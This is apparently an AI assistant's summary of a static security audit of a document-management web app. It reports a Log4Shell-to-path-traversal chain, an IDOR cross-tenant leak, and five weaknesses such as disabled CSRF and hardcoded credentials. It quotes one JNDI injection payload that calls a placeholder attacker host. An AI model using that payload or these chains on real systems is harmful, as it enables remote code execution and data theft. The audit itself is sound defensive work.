

The chained vulnerability static audit is complete. Here's a summary of findings:

---

## Audit Complete — 2 Chained Vulnerabilities Found

### Chain 1: Log4Shell RCE → Path Traversal → Arbitrary File Read (CRITICAL)

A 4-link chain where:
1. **Entry**: The "Audit & Event Dispatcher" frontend lets authenticated users send arbitrary HTTP header values to the server
2. **Hop**: `DocumentController` logs the `User-Agent` header directly via `logger.info()` — with Log4j 2.14.1 (pinned in `pom.xml`), a crafted value like `${jndi:ldap://attacker.com/x}` triggers JNDI lookup (CVE-2021-44228)
3. **Chain Extension**: After RCE, the attacker uses `serveDocumentFile()` which concatenates user input directly into a file path with **no `normalize()` or prefix check** — enabling arbitrary file read
4. **Sink**: System files (config, credentials, keys) can be exfiltrated

### Chain 2: IDOR → Cross-Tenant Document Exfiltration (HIGH)

The `GET /api/documents/{id}` endpoint has **no ownership check** — any authenticated user who can guess document IDs can read the full `Document` entity including `fileContentPlaintext` from any case, bypassing the tenant-scoped authorization on other endpoints.

### 5 Cross-Cutting Weaknesses

| # | Weakness | Severity |
|---|---|---|
| 3.1 | Hardcoded seed credentials in source + displayed in HTML | MEDIUM |
| 3.2 | CSRF explicitly disabled | MEDIUM |
| 3.3 | Attorneys/admins see all cases (over-permissive) | LOW–MEDIUM |
| 3.4 | DB credentials exposed in `application.properties` | LOW |
| 3.5 | No rate limiting on `/login` | LOW–MEDIUM |

The full report with Mermaid attack graphs, line-by-line evidence, and remediation priorities has been written to `docs/security/CHAINED_VULNERABILITIES_REVIEW.md`.
